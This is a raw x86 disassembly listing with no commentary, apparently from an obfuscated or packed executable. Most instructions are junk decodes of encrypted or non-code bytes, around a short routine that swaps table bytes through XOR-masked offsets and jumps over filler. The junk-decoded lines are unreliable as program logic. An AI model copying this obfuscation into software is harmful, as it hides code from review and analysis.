  40498a:	mov    ah,0x21
  40498c:	setae  BYTE PTR [edi]
  40498f:	lods   al,BYTE PTR ds:[esi]
  404990:	mov    ch,al
  404992:	inc    esp
  404993:	es mov cl,0xa4
  404996:	leave  
  404997:	mov    esp,0x5b81341a
  40499c:	fdivr  st,st(4)
  40499e:	call   0x472d:0x93366b25
  4049a5:	(bad)  [edx]
  4049a7:	pop    edx
  4049a8:	fadd   st,st(7)
  4049aa:	fwait
  4049ab:	xrstor [edi-0x6c89d5e1]
  4049b2:	lea    eax,[ebp-0x29]
  4049b5:	lods   al,BYTE PTR ds:[esi]
  4049b6:	mov    BYTE PTR [ebx-0x4a58f534],al
  4049bc:	sub    eax,0x60efc644
  4049c1:	(bad)  
  4049c2:	cwde   
  4049c3:	mov    eax,0xd0d433f4
  4049c8:	lds    eax,FWORD PTR [ecx+0x59]
  4049cb:	dec    ecx
  4049cc:	mov    ecx,0x3c221374
  4049d1:	fld    st(6)
  4049d3:	xor    ch,al
  4049d5:	sar    BYTE PTR [ebx+0x2c9079d8],1
  4049db:	push   ss
  4049dc:	jmp    0x404a44
  4049de:	addr16 mov eax,0xd526d235
  4049e4:	(bad)  
  4049e5:	sbb    al,0x60
  4049e7:	shl    BYTE PTR [edi+0x60],0x98
  4049eb:	push   esp
  4049ec:	cmp    BYTE PTR [ecx],bl
  4049ee:	out    dx,al
  4049ef:	sub    al,0xa2
  4049f1:	push   0x7d
  4049f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049f4:	pop    ebp
  4049f5:	mov    edi,0x6a91c22c
  4049fa:	pop    edx
  4049fb:	dec    esp
  4049fc:	push   edx
  4049fd:	leave  
  4049fe:	lods   eax,DWORD PTR ds:[esi]
  4049ff:	lods   eax,DWORD PTR ds:[esi]
  404a00:	fcom   DWORD PTR [ebx-0x3]
  404a03:	fldenv [edx+0x3abe3889]
  404a09:	push   esi
  404a0a:	jmp    0x404a51
  404a0c:	lds    esp,FWORD PTR [ebx+0x57511e3e]
  404a12:	mov    BYTE PTR [si-0x45],0xa4
  404a17:	cdq    
  404a18:	or     BYTE PTR [edi],0xc8
  404a1b:	xchg   edx,eax
  404a1c:	rcr    BYTE PTR [esi+ebx*1-0x724674e1],0x1e
  404a24:	lock sar BYTE PTR [edx+0xd415212],1
  404a2b:	mov    ecx,0x36704f7c
  404a30:	int3   
  404a31:	ja     0x4049dd
  404a33:	(bad)  
  404a34:	push   cs
  404a35:	call   0x3ba9d780
  404a3a:	arpl   WORD PTR [esp+ebp*1-0x2b],cx
  404a3e:	sbb    al,0x40
  404a40:	push   ebx
  404a41:	mov    dh,BYTE PTR [ebp-0x62]
  404a44:	pop    ebx
  404a45:	into   
  404a46:	lods   eax,DWORD PTR ds:[esi]
  404a47:	popf   
  404a48:	gs pop edx
  404a4a:	mov    cl,0xb3
  404a4c:	cmp    ah,bl
  404a4e:	push   ebx
  404a4f:	pop    ss
  404a50:	xchg   di,ax
  404a52:	leave  
  404a53:	mov    WORD PTR [esi+ebp*1],gs
  404a56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a58:	out    dx,eax
  404a59:	scas   eax,DWORD PTR es:[edi]
  404a5a:	sahf   
  404a5b:	ins    BYTE PTR es:[edi],dx
  404a5c:	jnp    0x404a32
  404a5e:	inc    edi
  404a5f:	adc    dh,BYTE PTR [esi+0x23]
  404a62:	xor    DWORD PTR [edx-0x2e],ebp
  404a65:	dec    ebx
  404a66:	cmp    eax,0xf3ce79bd
  404a6b:	mov    dl,BYTE PTR [edx]
  404a6d:	jnp    0x404a75
  404a6f:	fwait
  404a70:	rcl    DWORD PTR [eax],cl
  404a72:	mov    edx,0x1a82596a
  404a77:	mov    eax,DWORD PTR [edi+eax*4+0x7b]
  404a7b:	xchg   esi,eax
  404a7c:	aad    0x8b
  404a7e:	or     eax,0xae5ec05c
  404a83:	jmp    0x4d3f:0xece0d365
  404a8a:	lds    ecx,FWORD PTR [ebx]
  404a8c:	push   eax
  404a8d:	dec    edi
  404a8e:	adc    DWORD PTR [ecx-0x6656fb86],0x4804285
  404a98:	and    edx,DWORD PTR [edx-0x17]
  404a9b:	add    al,0x29
  404a9d:	ror    BYTE PTR [edx-0x1044f684],cl
  404aa3:	repz retf 0xc7db
  404aa7:	inc    ebp
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x733c6a28
  404b32:	pop    ecx
  404b33:	adc    al,BYTE PTR [ecx]
  404b35:	mov    ds:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b40
  404b3e:	hlt    
  404b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b40:	push   ecx
  404b41:	repnz push 0xffeaa8a9
  404b47:	sbb    BYTE PTR [eax+0xe3059c],bh
  404b4d:	mov    al,ds:0x766f1760
  404b52:	fwait
  404b53:	test   esi,esp
  404b55:	cmp    eax,0x465b52fe
  404b5a:	ja     0x404b20
  404b5c:	mov    eax,ds:0xc9d0e769
  404b61:	ins    BYTE PTR es:[edi],dx
  404b62:	sbb    BYTE PTR [eax],dl
  404b64:	mov    ds:0xd8becced,al
  404b69:	jge    0x404b60
  404b6b:	or     bl,BYTE PTR [edi+0x1ef4ad2e]
  404b71:	adc    DWORD PTR ds:0x8970bf5c,ebx
  404b77:	jae    0x404b1b
  404b79:	ror    DWORD PTR [edi+esi*2+0x40c50bca],1
  404b80:	popa   
  404b81:	fwait
  404b82:	inc    esp
  404b83:	sub    DWORD PTR [edx+eax*4-0x6e9f3453],edx
  404b8a:	out    0x6a,eax
  404b8c:	xchg   DWORD PTR [edi-0x54],edi
  404b8f:	jno    0x404bee
  404b91:	ror    BYTE PTR [eax+0x404c9a7f],0x34
  404b98:	and    eax,0xac4c7a14
  404b9d:	loopne 0x404b6c
  404b9f:	cmp    ah,BYTE PTR [ecx-0x5a]
  404ba2:	loope  0x404b96
  404ba4:	popf   
  404ba5:	cs jae 0x404ba3
  404ba8:	add    DWORD PTR [edi+0x61],ebx
  404bab:	push   0xffffffeb
  404bad:	ret    0x5716
  404bb0:	hlt    
  404bb1:	adc    eax,0x7e3836fe
  404bb6:	inc    ebx
  404bb7:	sti    
  404bb8:	xor    esp,esi
  404bba:	(bad)  
  404bbb:	xor    edx,DWORD PTR ds:0x716f6eea
  404bc1:	pop    ss
  404bc2:	repnz pop ebp
  404bc4:	cmp    DWORD PTR [eax],eax
  404bc6:	fstp   DWORD PTR [eax-0x33df205b]
  404bcc:	cmp    esp,edx
  404bce:	cwde   
  404bcf:	enter  0x3fb9,0x2b
  404bd3:	idiv   BYTE PTR [ebp+0x147368df]
  404bd9:	fisttp DWORD PTR [esi+0x40e64329]
  404bdf:	loop   0x404b61
  404be1:	sub    al,BYTE PTR [eax+0x75dd2526]
  404be7:	fild   DWORD PTR [esi+edx*1]
  404bea:	mov    esi,0x3b930b6b
  404bef:	sub    eax,edx
  404bf1:	push   es
  404bf2:	and    BYTE PTR [ecx],cl
  404bf4:	rcl    BYTE PTR [ecx-0x26],1
  404bf7:	in     eax,0x11
  404bf9:	pop    esi
  404bfa:	add    ebx,ecx
  404bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bfd:	xlat   BYTE PTR ds:[ebx]
  404bfe:	je     0x404c37
  404c00:	icebp  
  404c01:	bnd jbe 0x404c58
  404c04:	sbb    ebp,DWORD PTR [ecx]
  404c06:	lea    eax,[ecx+0x634e3f9f]
  404c0c:	xchg   ebx,eax
  404c0d:	sub    al,0x17
  404c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c10:	xchg   cl,al
  404c12:	mov    ds:0xbccc252d,al
  404c17:	mov    bl,0xc9
  404c19:	daa    
  404c1a:	jecxz  0x404bf8
  404c1c:	(bad)  
  404c1d:	fcom   st(6)
  404c1f:	dec    eax
  404c20:	jne    0x404c30
  404c22:	in     al,0x1a
  404c24:	pop    es
  404c25:	mov    ebp,DWORD PTR [ebx+ecx*2]
  404c28:	adc    DWORD PTR [esi],ecx
  404c2a:	mov    esp,0xcf1b4730
  404c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c30:	inc    ecx
  404c31:	dec    edx
  404c32:	mov    dh,0x61
  404c34:	jp     0x404beb
  404c36:	mov    dl,0x16
  404c38:	in     al,0x4f
  404c3a:	inc    edx
  404c3b:	sub    DWORD PTR [edi],0x3d
  404c3e:	or     BYTE PTR [edi],0x1
  404c41:	fld    TBYTE PTR [ebp-0x65]
  404c44:	ins    DWORD PTR es:[edi],dx
  404c45:	mov    bh,0xcd
  404c47:	pop    edx
  404c48:	scas   eax,DWORD PTR es:[edi]
  404c49:	mov    esi,ecx
  404c4b:	stos   BYTE PTR es:[edi],al
  404c4c:	adc    eax,0x8300da1a
  404c51:	mov    WORD PTR [edi],?
  404c53:	inc    ebp
  404c54:	pop    ebx
  404c55:	xchg   BYTE PTR [eax],bh
  404c57:	xchg   ebx,eax
  404c58:	xor    al,0x84
  404c5a:	inc    edi
  404c5b:	scas   eax,DWORD PTR es:[edi]
  404c5c:	(bad)  
  404c5d:	aaa    
  404c5e:	(bad)  
  404c5f:	fild   DWORD PTR [di+0x3d9f]
  404c64:	mov    ebx,0x65e47832
  404c69:	sub    esp,eax
  404c6b:	mov    eax,0xecaa8a03
  404c70:	sub    eax,0xddeb4a45
  404c75:	pop    ss
  404c76:	ret    
  404c77:	or     ch,0xa
  404c7a:	mov    ebp,0xe43f6991
  404c7f:	(bad)  
  404c80:	icebp  
  404c81:	jle    0x404c4a
  404c83:	std    
  404c84:	cmp    BYTE PTR [ebx],bl
  404c86:	xchg   esi,eax
  404c87:	outs   dx,BYTE PTR ds:[esi]
  404c88:	cwde   
  404c89:	xchg   ebx,eax
  404c8a:	(bad)  
  404c8b:	in     eax,dx
  404c8c:	jp     0x404c9b
  404c8e:	sahf   
  404c8f:	fstp   DWORD PTR [ebx]
  404c91:	sub    al,dl
  404c93:	aas    
  404c94:	sub    eax,0x3969b76f
  404c99:	cmp    al,0x97
  404c9b:	je     0x404c88
  404c9d:	sbb    al,0xd1
  404c9f:	mov    dl,BYTE PTR [ebp+0x1dd3f38f]
  404ca5:	loopne 0x404c48
  404ca7:	jo     0x404c48
  404ca9:	push   ebp
  404caa:	stos   DWORD PTR es:[edi],eax
  404cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cac:	xchg   esi,eax
  404cad:	mov    ah,0x9f
  404caf:	xchg   esp,eax
  404cb0:	test   al,0x94
  404cb2:	(bad)  
  404cb3:	repnz cwde 
  404cb5:	rcr    BYTE PTR [esi],0x75
  404cb8:	xor    al,cl
  404cba:	popa   
  404cbb:	mov    al,ds:0xda49e0ea
  404cc0:	or     BYTE PTR [ebx-0x8f05065],dh
  404cc6:	les    esi,FWORD PTR [edx-0x64]
  404cc9:	test   al,0xf
  404ccb:	fimul  DWORD PTR [edx+0x15]
  404cce:	popa   
  404ccf:	idiv   BYTE PTR [edi-0x12]
  404cd2:	ficomp WORD PTR [edx-0x52]
  404cd5:	iret   
  404cd6:	test   BYTE PTR [edi],0x25
  404cd9:	int3   
  404cda:	icebp  
  404cdb:	mov    WORD PTR [edx+ebx*4-0x1c],?
  404cdf:	clc    
  404ce0:	xchg   edi,eax
  404ce1:	repz dec eax
  404ce3:	pop    ebp
  404ce4:	sahf   
  404ce5:	pop    ebp
  404ce6:	aad    0x33
  404ce8:	jno    0x404ca6
  404cea:	mov    ebp,0xe3f3e745
  404cef:	call   FWORD PTR [edx+0x167dad0e]
  404cf5:	cmc    
  404cf6:	inc    edx
  404cf7:	jge    0x404d5c
  404cf9:	dec    edx
  404cfa:	(bad)  
  404cfb:	ds jbe 0x404ce6
  404cfe:	dec    ebx
  404cff:	mov    eax,0x2fa69e10
  404d04:	fadd   QWORD PTR [eax+0x666d8e23]
  404d0a:	mov    eax,ds:0x843bbcb
  404d0f:	inc    ebp
  404d10:	in     al,dx
  404d11:	std    
  404d12:	fisub  WORD PTR [esi-0x6]
  404d15:	xchg   DWORD PTR [esi+0x1c5dd319],esi
  404d1b:	out    0x17,eax
  404d1d:	pop    ebx
  404d1e:	les    eax,FWORD PTR [ebp+eax*8+0x4e]
  404d22:	cmp    dl,BYTE PTR [ebx+0x3597cbcb]
  404d28:	sbb    eax,0xd8cda2df
  404d2d:	push   edx
  404d2e:	pop    es
  404d2f:	stos   BYTE PTR es:[edi],al
  404d30:	int    0xf6
  404d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d33:	jae    0x404cf4
  404d35:	jmp    DWORD PTR [ebx+eiz*4]
  404d38:	jmp    0x404d2d
  404d3a:	in     eax,0xd8
  404d3c:	sbb    BYTE PTR [eax+0x70987b8a],dh
  404d42:	fptan  
  404d44:	jno    0x404d47
  404d46:	xchg   edx,eax
  404d47:	repz in al,0x96
  404d4a:	jae    0x404dbe
  404d4c:	push   eax
  404d4d:	stc    
  404d4e:	ds (bad) 
  404d50:	cs in  al,0xd3
  404d53:	lahf   
  404d54:	inc    BYTE PTR [eax+edi*4]
  404d57:	ret    0xe556
  404d5a:	mov    ah,0x14
  404d5c:	sbb    BYTE PTR [ebp-0x32],0x2b
  404d60:	enter  0xefb1,0x6d
  404d64:	stos   DWORD PTR es:[edi],eax
  404d65:	ss add edx,edi
  404d68:	jg     0x404d4a
  404d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d6b:	retf   0xa460
  404d6e:	xor    edx,DWORD PTR [ecx-0x28]
  404d71:	in     eax,dx
  404d72:	sub    al,0xf3
  404d74:	int    0x95
  404d76:	outs   dx,BYTE PTR ds:[esi]
  404d77:	cwde   
  404d78:	pop    edi
  404d79:	iret   
  404d7a:	scas   al,BYTE PTR es:[edi]
  404d7b:	or     ebx,DWORD PTR [ecx-0x27e0c77d]
  404d81:	retw   0x9a96
  404d85:	dec    esi
  404d86:	ror    DWORD PTR [esi-0x54],0xf1
  404d8a:	cwde   
  404d8b:	mov    bh,0xc1
  404d8d:	lea    esp,[eax+edi*2+0x76]
  404d91:	lea    ecx,[esi-0x3e]
  404d94:	jmp    0x404dc4
  404d96:	push   ds
  404d97:	call   0x4127:0x42556bf3
  404d9e:	mov    dl,0x69
  404da0:	gs push ebp
  404da2:	in     eax,dx
  404da3:	stos   DWORD PTR es:[edi],eax
  404da4:	into   
  404da5:	mov    esp,0x61410b46
  404daa:	arpl   WORD PTR [eax+0x22],bp
  404dad:	mov    edi,0x9313977a
  404db2:	mov    ch,0x86
  404db4:	gs addr16 adc al,0x43
  404db8:	inc    ebp
  404db9:	add    DWORD PTR [si-0x116d],edi
  404dbe:	adc    edi,DWORD PTR [eax]
  404dc0:	mov    esi,0x10cf2b90
  404dc5:	xor    edi,DWORD PTR [edx-0x6a]
  404dc8:	imul   ebx,DWORD PTR [esi],0x89ebbbf6
  404dce:	mov    eax,0x23b44d1e
  404dd3:	and    eax,0x52cae22
  404dd8:	xor    BYTE PTR [esi-0x56],bl
  404ddb:	jl     0x404d9e
  404ddd:	fisub  DWORD PTR [ebx-0x42806da6]
  404de3:	dec    edx
  404de4:	pushf  
  404de5:	mov    edi,0xc09478b5
  404dea:	dec    ebx
  404deb:	dec    eax
  404dec:	cli    
  404ded:	int3   
  404dee:	adc    eax,0xcc2c62f6
  404df3:	rcr    DWORD PTR [ecx-0x75],0xd2
  404df7:	xchg   DWORD PTR [esi-0x35],ecx
  404dfa:	pop    ecx
  404dfb:	and    dh,al
  404dfd:	neg    DWORD PTR [ebx+0x783c56f0]
  404e03:	xor    dh,BYTE PTR [edi+eax*8]
  404e06:	adc    eax,0x90cc1baa
  404e0b:	adc    al,0x1e
  404e0d:	shr    DWORD PTR [ecx+0x39],0xb7
  404e11:	add    eax,0x98792df8
  404e16:	mov    dl,0x4f
  404e18:	pop    edx
  404e19:	aad    0xa6
  404e1b:	push   eax
  404e1c:	aas    
  404e1d:	idiv   BYTE PTR [ebx+0x55339a28]
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404eaa
  404e5e:	xchg   ecx,eax
  404e5f:	ins    BYTE PTR es:[edi],dx
  404e60:	test   eax,0x7e7e218c
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e67
  404e6a:	das    
  404e6b:	or     eax,0xf26c08f5
  404e70:	in     al,dx
  404e71:	call   0xf74eac95
  404e76:	ror    BYTE PTR [esi-0x4d0907c1],1
  404e7c:	mov    edi,0xbbeb8e65
  404e81:	adc    BYTE PTR ds:[esi],0xfd
  404e85:	xor    esi,DWORD PTR [ebx+0x2f]
  404e88:	xchg   ecx,eax
  404e89:	ja     0x404e9d
  404e8b:	inc    dl
  404e8d:	aas    
  404e8e:	push   0x1b
  404e90:	mov    ebp,0x309f7c3c
  404e95:	cmp    cl,ah
  404e97:	add    BYTE PTR [eax],bh
  404e99:	jb     0x404ed9
  404e9b:	cmc    
  404e9c:	scas   al,BYTE PTR es:[edi]
  404e9d:	or     BYTE PTR [ebx+eiz*1],dh
  404ea0:	ds mov al,0xf4
  404ea3:	add    cl,BYTE PTR [edx+0x59dc5bdb]
  404ea9:	inc    ebx
  404eaa:	scas   eax,DWORD PTR es:[edi]
  404eab:	daa    
  404eac:	dec    esi
  404ead:	adc    DWORD PTR [ebx],0x54517a23
  404eb3:	aam    0x34
  404eb5:	retf   
  404eb6:	pop    edx
  404eb7:	(bad)  
  404eb8:	mov    ah,0x64
  404eba:	pop    edi
  404ebb:	retf   0xa8ed
  404ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ebf:	mov    ch,0xcf
  404ec1:	mov    dl,0xf4
  404ec3:	pop    esi
  404ec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ec5:	xchg   edx,eax
  404ec6:	cmp    eax,0x2d582cc0
  404ecb:	or     BYTE PTR [esi-0x29],0x80
  404ecf:	mov    DWORD PTR [ebp+ebp*8+0x68b78063],edx
  404ed6:	push   esi
  404ed7:	loopne 0x404f03
  404ed9:	pop    ebp
  404eda:	add    al,bl
  404edc:	lock dec ebp
  404ede:	add    eax,0x2512ac8a
  404ee3:	fidiv  WORD PTR [edi+0x1d]
  404ee6:	add    eax,0x62352d9c
  404eeb:	pop    ebp
  404eec:	aas    
  404eed:	iret   
  404eee:	ins    BYTE PTR es:[edi],dx
  404eef:	xor    bx,WORD PTR [edi+0x6bf8492c]
  404ef6:	adc    esp,DWORD PTR [esi+0x61]
  404ef9:	sbb    BYTE PTR [edx],dl
  404efb:	test   eax,0xeb639626
  404f01:	loop   0x404eb4
  404f03:	leave  
  404f04:	ret    
  404f05:	ins    DWORD PTR es:[edi],dx
  404f06:	(bad)  
  404f07:	outs   dx,BYTE PTR ds:[esi]
  404f08:	repz push 0xffffffbe
  404f0b:	test   DWORD PTR [esi+0xf],0x7b42bb4c
  404f12:	sbb    bh,BYTE PTR [ebx+edx*2+0x76]
  404f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f18:	jne    0x404ed2
  404f1a:	inc    ecx
  404f1b:	lock sbb al,0x10
  404f1e:	popa   
  404f1f:	inc    ebp
  404f20:	out    0x69,al
  404f22:	cld    
  404f23:	sbb    DWORD PTR [ecx],0x3
  404f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f27:	jno    0x404f1b
  404f29:	pop    eax
  404f2a:	mov    ch,0xa4
  404f2c:	sti    
  404f2d:	dec    ebx
  404f2e:	test   al,0x82
  404f30:	fsqrt  
  404f32:	push   esi
  404f33:	retf   
  404f34:	out    0xcb,al
  404f36:	xor    bh,ch
  404f38:	cld    
  404f39:	aaa    
  404f3a:	loop   0x404efe
  404f3c:	(bad)  
  404f3d:	jmp    0xe74eb60e
  404f42:	(bad)  
  404f43:	les    eax,FWORD PTR [eax+0x748bfb0]
  404f49:	shr    dl,1
  404f4b:	add    DWORD PTR [eax+0x26e6002e],edx
  404f51:	xchg   edx,eax
  404f52:	pop    ecx
  404f53:	int3   
  404f54:	imul   ecx,DWORD PTR [edi+0x25],0x48
  404f58:	scas   eax,DWORD PTR es:[edi]
  404f59:	in     al,0x24
  404f5b:	ja     0x404f97
  404f5d:	aam    0x97
  404f5f:	cmp    eax,0xfb242782
  404f64:	outs   dx,BYTE PTR ds:[esi]
  404f65:	cld    
  404f66:	pusha  
  404f67:	mov    ebx,0xb78aad55
  404f6c:	ja     0x404f4b
  404f6e:	ret    0x114
  404f71:	dec    ebp
  404f72:	mov    edi,0x5e471bee
  404f77:	pop    ebp
  404f78:	loopne 0x404f92
  404f7a:	out    0xe8,al
  404f7c:	lock std 
  404f7e:	mov    edi,0x9cc170af
  404f83:	xor    BYTE PTR [edi-0x4aed1c3a],cl
  404f89:	lea    ebx,[ebx]
  404f8b:	dec    edx
  404f8c:	cmp    DWORD PTR [ecx-0x43fd42dc],ebp
  404f92:	add    al,0x16
  404f94:	fdivr  DWORD PTR [edi]
  404f96:	adc    esi,DWORD PTR [esi+0x37]
  404f99:	inc    ebp
  404f9a:	mov    esp,0xe770d170
  404fa0:	inc    esp
  404fa1:	xor    DWORD PTR [esi],edx
  404fa3:	out    dx,al
  404fa4:	adc    eax,0x49a78060
  404fa9:	leave  
  404faa:	adc    bl,BYTE PTR [edx-0x25]
  404fad:	call   0x826125c7
  404fb2:	sub    al,BYTE PTR [ecx+0x413b8a73]
  404fb8:	je     0x404fba
  404fba:	stos   DWORD PTR es:[edi],eax
  404fbb:	inc    ebp
  404fbc:	dec    eax
  404fbd:	push   esp
  404fbe:	repz (bad) 
  404fc0:	xor    DWORD PTR [edi],esp
  404fc2:	push   eax
  404fc3:	ja     0x404f8c
  404fc5:	add    al,0x8c
  404fc7:	jb     0x404f95
  404fc9:	fs std 
  404fcb:	xor    eax,0xbee6281b
  404fd0:	xlat   BYTE PTR ds:[ebx]
  404fd1:	les    ebp,FWORD PTR [ecx+0x65]
  404fd4:	sbb    DWORD PTR [ebp-0x5e72cb66],0xe6f61739
  404fde:	aad    0xc6
  404fe0:	add    al,0x84
  404fe2:	sar    DWORD PTR [ebx+0x1f],0x86
  404fe6:	in     eax,dx
  404fe7:	xor    BYTE PTR [ecx-0x7c2fc612],ch
  404fed:	scas   eax,DWORD PTR es:[edi]
  404fee:	jge    0x404fbd
  404ff0:	retf   0xca4a
  404ff3:	loopne 0x405037
  404ff5:	cwde   
  404ff6:	int3   
  404ff7:	jg     0x405030
  404ff9:	add    BYTE PTR [esi+0xd],cl
  404ffc:	pop    eax
  404ffd:	dec    DWORD PTR [ebp-0x4f]
  405000:	pop    DWORD PTR [ecx+0x36f27b1e]
  405006:	sbb    ch,BYTE PTR [ecx+0x5eb8eed2]
  40500c:	data16 ins BYTE PTR es:[edi],dx
  40500e:	icebp  
  40500f:	pop    es
  405010:	pop    ds
  405011:	ins    DWORD PTR es:[edi],dx
  405012:	in     al,dx
  405013:	xor    al,0x61
  405015:	outs   dx,BYTE PTR ds:[esi]
  405016:	mov    DWORD PTR [edi+edi*4-0x416aae51],esi
  40501d:	inc    ecx
  40501e:	pusha  
  40501f:	ret    0xddff
  405022:	jecxz  0x40503c
  405024:	xchg   ecx,eax
  405025:	outs   dx,DWORD PTR ds:[esi]
  405026:	and    al,ch
  405028:	inc    ebp
  405029:	aad    0xdf
  40502b:	aas    
  40502c:	fwait
  40502d:	push   edx
  40502e:	out    0xb0,eax
  405030:	adc    ch,dl
  405032:	ins    DWORD PTR es:[edi],dx
  405033:	iret   
  405034:	scas   al,BYTE PTR es:[edi]
  405035:	cli    
  405036:	not    DWORD PTR [eax-0x57]
  405039:	cmp    al,0xd1
  40503b:	mov    eax,0x24db7f97
  405040:	rol    BYTE PTR [edi-0x68],0x4f
  405044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405045:	rcl    DWORD PTR [edx+eiz*4+0x610e20ff],1
  40504c:	mov    edx,?
  40504e:	xor    esi,DWORD PTR [edx+0xd]
  405051:	jne    0x4050d0
  405053:	out    0x77,al
  405055:	lock ret 
  405057:	mov    ebx,0x7770f39e
  40505c:	lea    ebp,[ebx+0x6f]
  40505f:	pusha  
  405060:	push   edx
  405061:	sar    ch,cl
  405063:	scas   eax,DWORD PTR es:[edi]
  405064:	mov    al,0xf5
  405066:	push   ds
  405067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405068:	sub    ecx,DWORD PTR [esi+ecx*4]
  40506b:	inc    esp
  40506c:	std    
  40506d:	sub    eax,0x87103c27
  405072:	mov    edi,0xaa305ca
  405077:	fbld   TBYTE PTR [edx]
  405079:	sub    eax,0x1e8def5a
  40507e:	ja     0x405061
  405080:	outs   dx,BYTE PTR ds:[esi]
  405081:	xlat   BYTE PTR ds:[ebx]
  405082:	push   edx
  405083:	xor    BYTE PTR [edi-0x28847065],dh
  405089:	mov    al,BYTE PTR [ebp+0x486cb601]
  40508f:	dec    edx
  405090:	inc    eax
  405091:	xchg   edx,eax
  405092:	push   ss
  405093:	test   BYTE PTR [edi],al
  405095:	popa   
  405096:	mov    esi,DWORD PTR [eax]
  405098:	loopne 0x4050fc
  40509a:	sbb    al,0x40
  40509c:	jae    0x4050af
  40509e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40509f:	jo     0x4050a9
  4050a1:	and    dh,BYTE PTR [edi]
  4050a3:	jns    0x40509c
  4050a5:	pop    esi
  4050a6:	mov    es,WORD PTR ds:0xe0371b35
  4050ac:	lahf   
  4050ad:	xchg   BYTE PTR [ecx],dh
  4050af:	daa    
  4050b0:	sub    al,0x1a
  4050b2:	inc    esp
  4050b3:	call   0x11511c4e
  4050b8:	sbb    ah,BYTE PTR ds:0x98a2da2c
  4050be:	pop    ss
  4050bf:	push   eax
  4050c0:	nop
  4050c1:	pop    esp
  4050c2:	fwait
  4050c3:	xor    eax,0x93b1f7c9
  4050c8:	jl     0x40506c
  4050ca:	ins    DWORD PTR es:[edi],dx
  4050cb:	or     dl,BYTE PTR [eax-0x4836b810]
  4050d1:	inc    esp
  4050d2:	and    al,0x92
  4050d4:	lods   al,BYTE PTR ds:[esi]
  4050d5:	add    BYTE PTR [eax],dl
  4050d7:	pop    ecx
  4050d8:	jmp    0x405138
  4050da:	and    eax,DWORD PTR cs:[eax-0x23]
  4050de:	adc    BYTE PTR [eax-0x8],0x8f
  4050e2:	ss rol ecx,1
  4050e5:	ins    BYTE PTR es:[edi],dx
  4050e6:	fimul  WORD PTR [edi]
  4050e8:	jp     0x4050dd
  4050ea:	test   BYTE PTR [edx+edx*1+0x75c16fa6],al
  4050f1:	test   BYTE PTR [ebx+edi*4+0x47],cl
  4050f5:	pop    ecx
  4050f6:	mov    ebp,0x25d9f1a2
  4050fb:	neg    DWORD PTR [ecx+0x79]
